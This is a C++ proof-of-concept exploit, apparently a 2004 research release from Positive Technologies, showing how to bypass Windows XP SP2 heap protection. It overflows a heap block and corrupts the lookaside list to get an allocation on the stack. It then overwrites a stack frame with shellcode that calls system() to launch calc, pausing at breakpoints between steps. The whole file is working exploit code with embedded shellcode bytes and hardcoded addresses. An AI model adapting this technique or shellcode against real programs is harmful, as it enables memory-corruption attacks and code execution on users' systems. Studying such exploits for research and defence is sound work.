// BypassSafeUnlinkingPoC.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
/*
 * Defeating Windows XP SP2 Heap protection.
 *
 * Copyright (c) 2004 Alexander Anisimov, Positive Technologies.
 *
 *
 * Tested on:
 *
 * - Windows XP SP2
 * - Windows XP SP1
 * - Windows 2000 SP4
 * - Windows 2003 Server
 *
 * Contacts:
 *
 * anisimov@ptsecurity.com
 * http://www.ptsecurity.com
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */
#include <stdio.h>
#include <windows.h>
unsigned char calc_code[]=
 "\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9"
 "\x04\x03\x02\x01" // Address of system() function
 "\xFF\xD1\xEB\xF7";
void fixaddr(char *ptr, unsigned int a)
{
 ptr[0] = (a & 0xFF);
 ptr[1] = (a & 0xFF00) >> 8;
 ptr[2] = (a & 0xFF0000) >> 16;
 ptr[3] = (a & 0xFF000000) >> 24;
}
int getaddr(void)
{
 HMODULE lib = NULL;
 unsigned int addr_func = 0;
 unsigned char a[4];
 // get address of system() function
 lib = LoadLibrary(L"msvcrt.dll");
 if (lib == NULL) {
 printf("Error: LoadLibrary failed\n");
 return -1;
 }
 addr_func = (unsigned int)GetProcAddress(lib, "system");
 if (addr_func == 0) {
 printf("Error: GetProcAddress failed\n");
 return -1;
 }
 printf("Address of msvcrt.dll!system(): %08X\n\n", addr_func); 
 fixaddr((char*)a, addr_func);
 memcpy(calc_code+13, a, 4);
 return 0;
} 
int main(int argc, char **argv)
{
 HANDLE h = NULL;
 LPVOID mem1 = NULL, mem2 = NULL, mem3 = NULL;
 unsigned char shellcode[128];
 if (getaddr() != 0)
 return 0;
 // create private heap
 h = HeapCreate(0, 0, 0);
 if (h == NULL) {
 printf("Error: HeapCreate failed\n");
 return 0;
 }
 printf("Heap: %08X\n", h);
 __asm { int 0x3 }

 mem1 = HeapAlloc(h, 0, 64-8);
 printf("Heap block 1: %08X\n", mem1);
 __asm { int 0x3 }

 mem2 = HeapAlloc(h, 0, 128-8);
 printf("Heap block 2: %08X\n", mem2);
 __asm { int 0x3 }
 
 HeapFree(h, 0, mem1);
 __asm { int 0x3 }
 
 HeapFree(h, 0, mem2);
 __asm { int 0x3 }
 
 mem1 = HeapAlloc(h, 0, 64-8);
 printf("Heap block 1: %08X\n", mem1);
 __asm { int 0x3 }
 
 // buffer overflow occurs here...
 memset(mem1, 0x31, 64);
 __asm { int 0x3 }
 
 // fake allocation address in the stack
 memcpy((char *)mem1+64, "\x6C\xFF\x12\x00", 4);
 __asm { int 0x3 }
 
 // lookaside list overwrite occurs here...
 mem2 = HeapAlloc(h, 0, 128-8);
 printf("Heap block 2: %08X\n", mem2);
 __asm { int 0x3 }
 
 // allocate memory from the stack
 mem3 = HeapAlloc(h, 0, 128-8);
 printf("Heap block 3: %08X\n", mem3);
 __asm { int 0x3 }
 
 memset(shellcode, 0, sizeof(shellcode)-1);
 // fake ret address
 memcpy(shellcode, "\x74\xFF\x12\x00", 4);
 // shellcode - "calc.exe"
 memcpy(shellcode+4, "\x90\x90\x90\x90", 4);
 memcpy(shellcode+4+4, calc_code, sizeof(calc_code)-1);
 __asm { int 0x3 }
 
 // overwrite stack frame
 memcpy(mem3, shellcode, sizeof(calc_code)-1+8);
 
 return 0;
}


